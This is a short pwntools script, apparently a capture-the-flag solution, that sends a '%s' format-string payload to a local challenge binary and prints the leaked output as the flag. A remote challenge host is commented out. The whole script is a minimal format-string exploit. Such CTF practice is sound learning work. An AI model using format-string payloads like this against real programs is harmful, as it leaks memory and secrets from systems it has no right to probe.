from pwn import *

r = process("./source/format")
#r = remote("formatstring.heltsikker.no", 9004)

r.sendline("%s")
r.recvuntil("Output: ")
data = r.recvline()
print("Flag:", data)

